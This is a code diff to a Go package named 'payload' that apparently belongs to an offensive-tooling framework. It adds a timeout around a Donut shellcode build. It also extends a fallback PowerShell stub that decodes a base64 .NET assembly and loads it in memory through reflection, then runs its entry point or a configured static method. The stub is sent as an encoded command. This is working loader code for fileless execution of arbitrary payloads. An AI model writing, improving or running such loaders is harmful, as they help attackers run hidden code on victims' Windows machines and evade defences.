@@ -2,6 +2,7 @@ package payload
 
 import (
 	"bytes"
+	"context"
 	"encoding/base64"
 	"fmt"
 	"log/slog"
@@ -125,10 +126,15 @@ func generateWithDonutCLI(donutPath string, cfg DonutConfig) ([]byte, error) {
 	outPath := filepath.Join(tmpDir, "loader.bin")
 	args = append(args, "-o", outPath)
 
-	cmd := exec.Command(donutPath, args...)
+	ctx, cancel := context.WithTimeout(context.Background(), buildTimeout)
+	defer cancel()
+	cmd := exec.CommandContext(ctx, donutPath, args...)
 	var stderr bytes.Buffer
 	cmd.Stderr = &stderr
 	if err := cmd.Run(); err != nil {
+		if ctx.Err() == context.DeadlineExceeded {
+			return nil, fmt.Errorf("donut CLI timed out after %s: %w", buildTimeout, err)
+		}
 		return nil, fmt.Errorf("donut CLI failed: %w\n%s", err, stderr.String())
 	}
 
@@ -148,8 +154,16 @@ func generateFallbackShellcode(cfg DonutConfig) ([]byte, error) {
 $bytes=[System.Convert]::FromBase64String('%s');
 $asm=[System.Reflection.Assembly]::Load($bytes);
 $ep=$asm.EntryPoint;
-if ($ep) { $ep.Invoke($null, @(,[string[]]@())) }
-`, b64)
+if ($ep) {
+    $ep.Invoke($null, @(,[string[]]@()))
+} elseif ('%s' -ne '' -and '%s' -ne '') {
+    $t=$asm.GetType('%s');
+    $m=$t.GetMethod('%s', [System.Reflection.BindingFlags]'Static,Public,NonPublic');
+    if ($m) { $m.Invoke($null, @(,[string[]]@())) } else { throw 'configured method not found' }
+} else {
+    throw 'assembly has no EntryPoint and no class/method configured'
+}
+`, b64, cfg.ClassName, cfg.MethodName, cfg.ClassName, cfg.MethodName)
 
 	// Encode as base64 PowerShell command for -EncodedCommand
 	encoded := base64.StdEncoding.EncodeToString([]byte(psCmd))
